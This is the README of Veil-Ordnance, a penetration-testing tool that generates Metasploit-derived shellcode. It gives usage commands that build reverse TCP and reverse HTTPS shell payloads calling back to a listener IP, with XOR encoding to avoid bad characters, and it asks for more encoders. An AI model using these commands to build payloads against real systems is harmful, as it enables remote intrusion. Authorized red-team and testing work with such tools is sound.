Veil-Ordnance
======

Veil-Ordnance is designed to quickly generate shellcode that can be used for exploits or payloads.  The inspiration for this came after multiple discussions between @christruncer, @themightyshiv, and @harmj0y where we identified a need for a tool that generates shellcode, that won't change its output on us.  Rather than rely on a third party to do this, we decided we should write our own.

All payloads in this tool were ported from the Metasploit Framework.  There is no claim to being the original author of any of the payloads.  The awesome guys working on the Metasploit Project deserve all praise for writing the different payloads within this tool.  Their payloads were simply ported from Ruby to Python.


Usage:

./Veil-Ordnance.py -p rev_tcp --ip 192.168.63.149 --port 8675

Examples:

./Veil-Ordnance.py -p rev_https --ip 192.168.63.149 --port 443 -e xor -b \x00\x0a --print-stats


Thanks:
Thanks to the Metasploit team for all their hard work.  Allowing their code to be used by the community is awesome, and really appreciated.  Thanks to Jon Yates (@redbeardsec) for really helping to get my up to speed and providing his analysis on how payloads are generated.  Thanks to Justin Warner (@sixdub) for allowing me to include his shellcode encoder within Ordnance.


Call to Action:
We'd love for an additional encoder, or more, to be added to Veil-Ordnance.  The more that can be added in/ported, the better coverage in ensuring that at least one encoder could be used to prevent any specific bad character.  If anyone is willing to port one, or send us a python version of their encoder, please hit us up, or send a pull request!  We'd be happy to give full credit to you.

avlol
